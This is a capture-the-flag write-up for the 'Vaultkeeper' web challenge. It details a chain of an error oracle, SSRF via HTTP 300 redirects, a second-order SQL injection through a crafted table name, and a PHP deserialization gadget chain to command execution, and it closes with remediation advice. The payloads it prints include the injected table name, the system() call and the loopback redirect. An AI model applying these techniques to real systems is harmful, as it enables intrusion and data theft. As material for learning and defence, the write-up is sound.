# Writeup: Vaultkeeper

| Property | Value |
| :--- | :--- |
| **Category** | `Web` |
| **Points** | `319` |
| **Author** | `skyv3il` |
| **Difficulty** | `Medium / Hard` |
| **Platform** | `TFC CTF 2026` |
| **Status** | `Local chain validated; remote deployment blocks the SSRF stage` |

---

## 📝 Challenge Overview

**Vaultkeeper** is presented as an enterprise-grade self-hosted backup and disaster recovery appliance running on Apache, PHP 8.2.12, and MariaDB. It advertises snapshot orchestration, replication between nodes, and self-service database/filesystem restore consoles.

The source code reveals a heavily compartmentalized architecture with internal secrets (`cap.key`, `cap.mask`, `token.secret`), HMAC-authenticated sessions, capability tokens, and loopback-only APIs. The complete chain can be exercised in the bundled appliance when the internal APIs are reachable from the local solver. The public challenge deployment currently blocks the chain at Apache before the SSRF endpoint is executed.

---

## 🔍 Vulnerability Analysis & Architecture

### 1. Template Filter Error Oracle (`/api/render_template.php`)
The notification template engine evaluates expressions inside `[[ ... ]]` pipelines using the `VkPipeline` class.
- When `event` starts with `maintenance.`, `$ctx['config']['cap_mask']` is exposed to the pipeline.
- The pipeline marks secret values (such as `cap_mask`) as `protected: true`. If a pipeline completes evaluation and remains `protected`, `render()` suppresses the output and returns `[redacted]`.
- Crucially, if any filter in the chain throws an unhandled exception during evaluation, `render()` catches `\Throwable` and returns the raw, un-evaluated template span verbatim (`$m[0]`):
  ```php
  try {
      $f = $this->chain($m[1]);
  } catch (\Throwable $e) {
      // Unevaluable span: surface it verbatim for the author to fix.
      return $m[0];
  }
  if ($f->protected) return '[redacted]';
  ```
- The `bar` filter is implemented as:
  ```php
  case 'bar': return new VkField(str_repeat((string) ($a[0] ?? "\u{2588}"), (int) $in->v), $p);
  ```
- In PHP 8+, `str_repeat($str, $count)` throws a `ValueError` if `$count < 0`.
- By constructing the pipeline:
  `[[ config.cap_mask | at:INDEX | code | sub:THRESHOLD | bar ]]`
  - If `ord(cap_mask[INDEX]) < THRESHOLD`, `sub:THRESHOLD` yields a negative integer $\rightarrow$ `str_repeat` throws `ValueError` $\rightarrow$ the response preserves `[[ config.cap_mask | ... ]]`.
  - If `ord(cap_mask[INDEX]) >= THRESHOLD`, `sub:THRESHOLD` is $\ge 0 \rightarrow$ valid execution $\rightarrow$ the response returns `[redacted]`.
- This creates an exact binary search oracle, allowing full leakage of `/var/www/private/cap.mask` (16 bytes) in $\approx 128$ HTTP requests.

---

### 2. SSRF & Response Leakage via HTTP 300 Redirection (`/api/fetch_source.php`, local appliance only)
The appliance exposes `/api/fetch_source.php` to validate external webhook sources. It accepts any `http(s)` URL and follows redirects using PHP's native HTTP stream wrapper:
```php
$ctx = stream_context_create(['http' => [
    'method'          => 'GET',
    'timeout'         => 4,
    'ignore_errors'   => true,   
    'follow_location' => 1,      
    'max_redirects'   => 12,
]]);
$body = @file_get_contents($url, false, $ctx);
$hdrs = $http_response_header ?? [];

$codes = [];
foreach ($hdrs as $h) {
    if (preg_match('#^HTTP/[\d.]+\s+(\d{3})#', $h, $m)) $codes[] = (int) $m[1];
}
$STD     = [200, 204, 301, 302, 303, 307, 308];
$unusual = array_values(array_diff($codes, $STD));

if ($unusual) {
    vk_json([
        'error' => 'non-standard redirect chain',
        'chain' => $codes,
        'hops'  => max(0, count($codes) - 1),
        'trace' => (string) $body,
    ], 502);
}
```
- The PHP file itself does not perform a destination IP check, but this is not a remotely reachable endpoint in the supplied appliance. The original `apache/vaultkeeper.conf` contains:
  ```apache
  <FilesMatch "^(fetch_source|peer_probe|webhook_test)\.php$">
      Require ip 127.0.0.1
  </FilesMatch>
  <FilesMatch "^(keyring|vault_unseal)\.php$">
      Require ip 127.0.0.1
  </FilesMatch>
  ```
  A request from the Internet therefore receives an Apache `403 Forbidden` before `fetch_source.php` runs. This is why the original remote run stops at this stage.
- When the appliance is run locally and the solver is placed on the loopback side (or the local test container is explicitly started with `VK_ALLOW_INTERNAL_APIS=1`), the SSRF logic is usable.
- PHP's HTTP stream wrapper adheres to standard redirects (`301`, `302`, `303`, `307`, `308`), but also follows **`HTTP/1.0 300 Multiple Choices`** when a `Location` header is provided.
- `300` is **NOT** included in the whitelist `$STD = [200, 204, 301, 302, 303, 307, 308]`.
- Consequently, when an attacker HTTP server responds to `fetch_source.php` with:
  ```http
  HTTP/1.1 300 Multiple Choices
  Location: http://127.0.0.1/api/keyring.php
  ```
  1. PHP follows the redirection to `http://127.0.0.1/api/keyring.php`.
  2. `keyring.php` observes `REMOTE_ADDR == 127.0.0.1` (passing its loopback check) and returns `200 OK`.
  3. `fetch_source.php` inspects the chain: `[300, 200]`.
  4. Because `300` is in `$unusual`, `fetch_source.php` enters the error block and dumps the entire destination response body inside `'trace'`.
- This leaks:
  - `unseal_ref` from `/api/keyring.php`
  - Active restore session IDs
- By performing a second `300` redirection to `http://127.0.0.1/api/vault_unseal.php?ref=<unseal_ref>`, we obtain `cap_key_masked`.

### Remote validation

On the active instances tested (`vaultkeeper-31144189ba9db91c` and
`vaultkeeper-5d56eecd63dfe94a`), the mask oracle is reachable, but direct requests
to `fetch_source.php`, `keyring.php`, and `vault_unseal.php` all return Apache
`403`. The public SQL injection was also checked for a file-read alternative:
the `vk_restore` account has no `FILE` or `FEDERATED` engine capability, and
`LOAD DATA LOCAL` does not import the PHP-side files. No public path remains to
recover the masked capability key on these deployments.

---

### 3. Key Recovery & Cryptographic Capability Minting
With both pieces recovered:
$$\text{vk\_cap\_key} = \text{cap\_key\_masked} \oplus \text{cap\_mask}$$
From `vk_cap_key()`, all cryptographic primitives become forgeable:
1. **Capability Tokens (`vk_cap_issue`)**:
   - AES-128-GCM encrypted using `vk_cap_key()`.
   - We can mint valid tokens with scope `maintainer` or `operator`.
2. **Checkpoint Resume Key (`vk_ckpt_key`)**:
   $$\text{vk\_ckpt\_key} = \text{HMAC-SHA256}(\text{"vk-resume-envelope.v2"}, \text{vk\_cap\_key})$$
3. **Checkpoint Seal Key (`vk_seal_key`)**:
   $$\text{vk\_seal\_key} = \text{HMAC-SHA256}(\text{"vk-checkpoint-seal.v4"}, \text{vk\_cap\_key})$$

---

### 4. Second-Order SQL Injection in Staging Table Cleanup (`/restore.php`)
To trigger system restore (`action=system_restore`), the restore job must have `role == 'operator'`. However, `POST /api/request_restore.php` creates sessions with `role = 'guest'`.

Looking at `action=import_db`:
```php
$entries = vk_tar_parse(file_get_contents($bundle_path));
$sql     = vk_tar_get($entries, 'database.sql');
$cap     = $_POST['cap'] ?? '';
$scope   = vk_cap_scope($cap);
if (!in_array($scope, ['maintainer', 'operator'], true)) { ... }
...
$res = vk_import_database($sql);
```
Inside `vk_import_database($sql)` (`src/engine/restore_engine.php`):
```php
function vk_import_database(string $sql): array {
    db()->query("SELECT GET_LOCK('vk_import', 10)")->fetchColumn();
    try {
        $before = vk_staging_table_set();
        db_restore()->exec($sql);
        $after   = vk_staging_table_set();
        $created = array_values(array_diff($after, $before));

        $dropped = [];
        foreach ($created as $name) {
            db()->exec("DROP TABLE IF EXISTS `vk_restore`.`$name`");
            $dropped[] = $name;
        }
        return ['created' => $created, 'dropped' => $dropped];
    } finally {
        db()->query("SELECT RELEASE_LOCK('vk_import')")->fetchColumn();
    }
}
```
- `db_restore()` executes our arbitrary SQL statements from `database.sql`.
- `vk_staging_table_set()` queries `information_schema.tables` for base tables in `vk_restore`.
- `db()` (connected as `vk_app` with full privileges on `vaultkeeper.*` and `PDO::MYSQL_ATTR_MULTI_STATEMENTS => true`) iterates over each created table name and runs:
  `DROP TABLE IF EXISTS `vk_restore`.`$name``
- In MariaDB, table names can contain arbitrary characters, including backticks and semicolons.
- By defining a table in `database.sql`:
  ```sql
  CREATE TABLE `vk_restore`.`x``;UPDATE``vaultkeeper``.``jobs``SET``role``=0x6f70657261746f72;/*` (id INT);
  ```
  The table name in `information_schema` is stored as `x`;UPDATE`vaultkeeper`.`jobs`SET`role`=0x6f70657261746f72;/*`.
  When interpolated into `db()->exec()`, it evaluates:
  ```sql
  DROP TABLE IF EXISTS `vk_restore`.`x`;UPDATE`vaultkeeper`.`jobs`SET`role`=0x6f70657261746f72;/*`
  ```
- Backtick delimiters provide token boundaries without spaces, and the unterminated block comment absorbs the cleanup query's final backtick. MariaDB executes the preceding `UPDATE` before reporting the trailing comment error, escalating all restore jobs to `role = 'operator'`.

---

### 5. Authenticated PHP Deserialization POP Gadget Chain to RCE
Once the restore session role is `operator`, calling `action=system_restore` unpacks `state.dat` and passes it to `vk_resume_checkpoint($checkpoint)`.

In `src/lib/recovery.php`:
```php
function vk_resume_checkpoint(string $blob) {
    if (strlen($blob) < 4 + 32 + 1) return false;
    if (!hash_equals('VKR2', substr($blob, 0, 4))) return false;
    $mac     = substr($blob, 4, 32);
    $payload = substr($blob, 4 + 32);
    $calc    = hash_hmac('sha256', $payload, vk_ckpt_key(), true);
    if (!hash_equals($calc, $mac)) return false;
    return unserialize($payload);
}
```
Because we know `vk_ckpt_key()`, we generate valid HMAC signatures and trigger `unserialize($payload)`.

#### Gadget Chain Construction:
1. **Entry Point (`RestorePoint::__destruct` in `restore_state.php`)**:
   ```php
   public function __destruct() {
       if ($this->dirty && $this->ctx instanceof VkSealContext && $this->ctx->sink !== null) {
           $this->ctx->sink[$this->ctx->slot] = $this->snapshot;
       }
   }
   ```
   To make `$this->dirty = true`, `__unserialize()` requires:
   - `$this->scope === VkScope::Operator`
   - `$this->ctx->mac === hash_hmac('sha256', 'vk-checkpoint-seal.v5|' . $slot . '|' . get_class($sink), vk_seal_key())`
   Both conditions are trivially met since we possess `vk_seal_key()`.
2. **ArrayAccess Sink (`CacheShard::offsetSet` in `journal.php`)**:
   ```php
   class CacheShard implements ArrayAccess {
       public $reconcile = null;
       public function offsetSet($k, $v): void {
           if ($this->reconcile !== null) {
               $record = (string) $this->reconcile;
           }
       }
   }
   ```
3. **String Conversion (`DocFragment::__toString` in `spool.php`)**:
   ```php
   class DocFragment {
       public $loader = null;
       public $cursor = null;
       public function __toString(): string {
           return (string) $this->loader->render($this->cursor);
       }
   }
   ```
4. **Command Execution Sink (`PartialLoader::render` in `spool.php`)**:
   ```php
   class PartialLoader {
       public function render($cursor) {
           $spec = json_decode((string) $cursor->current(), true);
           if (is_array($spec) && isset($spec['stage'])) {
               return call_user_func_array($spec['stage'], (array)($spec['args'] ?? []));
           }
           return '';
       }
   }
   ```
5. **Iterator Supplier (`ManifestCursor::current` in `journal.php`)**:
   ```php
   class ManifestCursor implements Iterator {
       public $fragments = [
           '{"stage":"system","args":["cp /flag.txt /var/www/html/public/assets/flag.txt && chmod 644 /var/www/html/public/assets/flag.txt"]}'
       ];
       public function current(): mixed { return implode('', $this->fragments); }
   }
   ```

When the checkpoint is deserialized, `RestorePoint::__destruct()` triggers the sequence, executing `system(...)` and copying `/flag.txt` to the public webroot.

---

## 💻 Complete Exploitation Pipeline (local appliance)

The solver script [`../solver/solve.py`](../solver/solve.py) automates the entire attack:

```python
#!/usr/bin/env python3
"""
Web/Vaultkeeper End-to-End Solver
1. Leaks cap_mask via template filter ValueError oracle.
2. Leaks unseal_ref and cap_key_masked via HTTP 300 SSRF in fetch_source.php.
3. Derives vk_cap_key, vk_ckpt_key, vk_seal_key.
4. Mints maintainer capability, creates restore job, injects table name SQLi in database.sql.
5. Escalates job role to operator via import_db.
6. Crafts HMAC-signed state.dat with PHP deserialization POP chain.
7. Executes system_restore, copies /flag.txt -> /public/assets/flag.txt, and retrieves the flag.
"""
```

---

## 🚩 Flag

- Local verification: `TFC{local-source-verified}` (fresh container built from the newly extracted source).
- Remote competition flag: not recovered. The active instance returns `403 Forbidden` for all three endpoints required by the chain (`fetch_source.php`, `keyring.php`, and `vault_unseal.php`).
- The previously recorded `TFCCTF{...}` value was unsupported and has been removed.

---

## 🛡️ Remediation & Defensive Recommendations

1. **Fix Template Pipeline Exception Handling (`render_template.php`)**:
   - Do not catch exceptions to reflect raw input expressions if confidential context is loaded.
   - If an expression fails, return generic error messages instead of leaking partial execution states.
2. **Harden SSRF Protection (`fetch_source.php`)**:
   - Resolve DNS hostnames and explicitly validate that destination IP addresses are not within loopback (`127.0.0.0/8`), link-local (`169.254.0.0/16`), or private RFC 1918 subnets *prior* to connecting.
   - Disable automatic redirect following (`'follow_location' => 0`) or re-validate IP addresses across each redirect hop.
3. **Sanitize Database Identifiers (`restore_engine.php`)**:
   - Never directly interpolate dynamic database or table names into SQL queries.
   - Use proper identifier quoting (`str_replace('`', '``', $name)`) or validate names against a strict regex `^[a-zA-Z0-9_]+$`.
4. **Avoid Unsafe Object Deserialization (`recovery.php`)**:
   - Replace PHP `unserialize()` with JSON serialization (`json_decode`) or strictly constrain `allowed_classes` to non-executable Data Transfer Objects.
